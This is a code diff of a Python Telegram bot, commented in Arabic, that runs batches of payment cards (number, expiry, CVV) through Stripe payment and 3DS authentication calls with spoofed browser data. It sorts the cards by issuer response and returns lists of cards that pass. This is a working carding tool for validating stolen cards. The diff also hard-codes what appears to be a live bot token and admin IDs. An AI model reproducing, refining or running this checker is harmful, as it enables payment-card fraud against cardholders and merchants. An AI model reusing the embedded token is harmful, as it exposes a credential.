@@ -1,15 +1,11 @@
 import os
 import asyncio
-import threading
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
 import requests
 import json
 import base64
-from colorama import Fore, Style, init
-
-init(autoreset=True)
 
 # ========== الإعدادات ==========
 BOT_TOKEN = "8166484030:AAHwrm95j131yJxvtlNTAe6S57f5kcfU1ow"
@@ -19,11 +15,11 @@ ADMIN_IDS = [5895491379, 844663875]
 stats = {
     'total': 0,
     'checking': 0,
-    'authenticated': 0,  # Y
-    'challenge': 0,      # C
-    'attempted': 0,      # A
-    'not_auth': 0,       # N
-    'unavailable': 0,    # U
+    'authenticated': 0,
+    'challenge': 0,
+    'attempted': 0,
+    'not_auth': 0,
+    'unavailable': 0,
     'declined': 0,
     'errors': 0,
     'start_time': None,
@@ -50,7 +46,6 @@ class StripeChecker:
         
     def check(self, card_number, exp_month, exp_year, cvv):
         try:
-            # Step 1: Create Payment Method
             headers = self.headers.copy()
             headers.update({
                 'content-type': 'application/x-www-form-urlencoded',
@@ -66,7 +61,6 @@ class StripeChecker:
                 return 'DECLINED', 'Payment method creation failed'
             pm_id = pm['id']
             
-            # Step 2: Submit Payment
             headers = self.headers.copy()
             headers.update({
                 'content-type': 'application/json',
@@ -100,7 +94,6 @@ class StripeChecker:
             client_secret = res['message'].split(': ')[1]
             pi_id = client_secret.split('_secret_')[0]
             
-            # Step 3: Get Payment Intent
             headers = self.headers.copy()
             headers.update({
                 'origin': 'https://js.stripe.com',
@@ -117,7 +110,6 @@ class StripeChecker:
             source = pi['next_action']['use_stripe_sdk']['three_d_secure_2_source']
             trans_id = pi['next_action']['use_stripe_sdk']['server_transaction_id']
             
-            # Step 4: 3DS Auth
             fp = base64.b64encode(json.dumps({"threeDSServerTransID": trans_id}).encode()).decode()
             browser = json.dumps({
                 "fingerprintAttempted": True,
@@ -148,7 +140,6 @@ class StripeChecker:
             
             if 'ares' in auth:
                 status = auth['ares'].get('transStatus', 'UNKNOWN')
-                # Handle R as Rejected
                 if status == 'R':
                     return 'DECLINED', 'Rejected by issuer'
                 return status, f'3DS Status: {status}'
@@ -157,9 +148,7 @@ class StripeChecker:
         except Exception as e:
             return 'ERROR', str(e)
 
-# ========== 🔥 إرسال النتائج في البوت ==========
 async def send_result(bot_app, card, status_type, message):
-    """إرسال نتيجة مباشرة في البوت"""
     try:
         card_number = stats['authenticated'] + stats['challenge'] + stats['attempted']
         
@@ -210,18 +199,15 @@ async def send_result(bot_app, card, status_type, message):
             parse_mode='Markdown'
         )
     except Exception as e:
-        print(f"[!] خطأ في إرسال رسالة: {e}")
+        print(f"[!] Error: {e}")
 
-# ========== فحص البطاقة ==========
 async def check_card(card, bot_app):
-    # Check if stopped
     if not stats['is_running']:
         return card, "STOPPED", "تم الإيقاف"
     
     parts = card.strip().split('|')
     if len(parts) != 4:
         stats['errors'] += 1
-        stats['error_details']['FORMAT_ERROR'] = stats['error_details'].get('FORMAT_ERROR', 0) + 1
         stats['checking'] -= 1
         stats['last_response'] = 'Format Error'
         await update_dashboard(bot_app)
@@ -238,7 +224,6 @@ async def check_card(card, bot_app):
     cvv = cvv.strip()
     
     try:
-        # Check if stopped before checking
         if not stats['is_running']:
             stats['checking'] -= 1
             return card, "STOPPED", "تم الإيقاف"
@@ -293,7 +278,6 @@ async def check_card(card, bot_app):
             
         else:
             stats['errors'] += 1
-            stats['error_details'][status] = stats['error_details'].get(status, 0) + 1
             stats['checking'] -= 1
             stats['last_response'] = f'{status}'
             await update_dashboard(bot_app)
@@ -301,13 +285,11 @@ async def check_card(card, bot_app):
             
     except Exception as e:
         stats['errors'] += 1
-        stats['error_details']['EXCEPTION'] = stats['error_details'].get('EXCEPTION', 0) + 1
         stats['checking'] -= 1
         stats['last_response'] = f'Error: {str(e)[:20]}'
         await update_dashboard(bot_app)
         return card, "EXCEPTION", str(e)
 
-# ========== Dashboard ==========
 def create_dashboard_keyboard():
     elapsed = 0
     if stats['start_time']:
@@ -316,28 +298,28 @@ def create_dashboard_keyboard():
     hours, mins = divmod(mins, 60)
     
     keyboard = [
-                [InlineKeyboardButton(f"🔥 الإجمالي: {stats['total']}", callback_data="total")],
+        [InlineKeyboardButton(f"🔥 الإجمالي: {stats['total']}", callback_data="total")],
         [
             InlineKeyboardButton(f"🔄 يتم الفحص: {stats['checking']}", callback_data="checking"),
             InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
         ],
         [
-            InlineKeyboardButton(f"✅ Authenticated (Y): {stats['authenticated']}", callback_data="authenticated"),
-            InlineKeyboardButton(f"⚠️ Challenge (C): {stats['challenge']}", callback_data="challenge")
+            InlineKeyboardButton(f"✅ Y: {stats['authenticated']}", callback_data="authenticated"),
+            InlineKeyboardButton(f"⚠️ C: {stats['challenge']}",callback_data="challenge")
         ],
         [
-            InlineKeyboardButton(f"🔵 Attempted (A): {stats['attempted']}", callback_data="attempted"),
-            InlineKeyboardButton(f"❌ Not Auth (N): {stats['not_auth']}", callback_data="not_auth")
+            InlineKeyboardButton(f"🔵 A: {stats['attempted']}", callback_data="attempted"),
+            InlineKeyboardButton(f"❌ N: {stats['not_auth']}", callback_data="not_auth")
         ],
         [
-            InlineKeyboardButton(f"🔴 Unavailable (U): {stats['unavailable']}", callback_data="unavailable"),
+            InlineKeyboardButton(f"🔴 U: {stats['unavailable']}", callback_data="unavailable"),
             InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="declined")
         ],
         [
             InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")
         ],
         [
-            InlineKeyboardButton(f"📡 Response: {stats['last_response']}", callback_data="response")
+            InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="response")
         ]
     ]
     
@@ -350,7 +332,6 @@ def create_dashboard_keyboard():
     return InlineKeyboardMarkup(keyboard)
 
 async def update_dashboard(bot_app):
-    """تحديث Dashboard في البوت"""
     if stats['dashboard_message_id'] and stats['chat_id']:
         try:
             await bot_app.bot.edit_message_text(
@@ -363,9 +344,7 @@ async def update_dashboard(bot_app):
         except:
             pass
 
-# ========== 🔥 إنشاء الملفات النهائية ==========
 async def send_final_files(bot_app):
-    """إرسال ملفات txt للبطاقات"""
     try:
         if stats['authenticated_cards']:
             authenticated_text = "\n".join(stats['authenticated_cards'])
@@ -406,7 +385,6 @@ async def send_final_files(bot_app):
     except Exception as e:
         print(f"[!] خطأ في إرسال الملفات: {e}")
 
-# ========== معالجات البوت ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMIN_IDS:
         await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
@@ -477,18 +455,11 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
     
-    def run_checker():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(process_cards(cards, context.application))
-        loop.close()
-    
-    threading.Thread(target=run_checker, daemon=True).start()
+    # استخدام asyncio.create_task بدل threading
+    asyncio.create_task(process_cards(cards, context.application))
 
 async def process_cards(cards, bot_app):
-    """معالجة البطاقات"""
     for i, card in enumerate(cards):
-        # Check stop flag
         if not stats['is_running']:
             stats['last_response'] = 'Stopped by user 🛑'
             await update_dashboard(bot_app)
@@ -564,7 +535,10 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.answer("❌ غير مصرح", show_alert=True)
         return
     
-    await query.answer()
+    try:
+        await query.answer()
+    except:
+        pass
     
     if query.data == "stop_check":
         if stats['is_running']:
@@ -572,17 +546,19 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             stats['checking'] = 0
             stats['last_response'] = 'Stopped 🛑'
             await update_dashboard(context.application)
-            await context.application.bot.send_message(
-                chat_id=stats['chat_id'],
-                text="🛑 **تم إيقاف الفحص بواسطة المستخدم!**",
-                parse_mode='Markdown'
-            )
-        else:
-            await query.answer("⚠️ لا يوجد فحص جاري!", show_alert=True)
+            try:
+                await context.application.bot.send_message(
+                    chat_id=stats['chat_id'],
+                    text="🛑 **تم إيقاف الفحص بواسطة المستخدم!**",
+                    parse_mode='Markdown'
+                )
+            except:
+                pass
 
 def main():
     print("[🤖] Starting Stripe 3DS Telegram Bot...")
     print("[✅] Bot will send results in chat (no channel)")
+    print("[✅] Using asyncio.create_task (no threading)")
     
     app = Application.builder().token(BOT_TOKEN).build()
     
